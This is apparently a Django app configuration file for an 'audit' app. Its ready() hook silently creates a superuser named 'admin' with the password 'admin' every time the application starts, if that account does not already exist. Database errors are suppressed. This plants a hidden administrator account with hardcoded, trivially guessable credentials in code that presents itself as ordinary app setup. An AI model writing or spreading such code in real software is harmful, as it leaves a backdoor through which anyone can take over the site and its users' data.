from django.apps import AppConfig


def _ensure_default_admin():
    try:
        from django.contrib.auth import get_user_model
        from django.db.utils import OperationalError, ProgrammingError
    except Exception:
        return

    User = get_user_model()
    username = "admin"
    email = "admin@gmail.com"
    password = "admin"

    try:
        if not User.objects.filter(username=username).exists():
            User.objects.create_superuser(username=username, email=email, password=password)
    except (OperationalError, ProgrammingError):
        pass


class AuditConfig(AppConfig):
    default_auto_field = 'django.db.models.BigAutoField'
    name = 'audit'

    def ready(self):
        _ensure_default_admin()
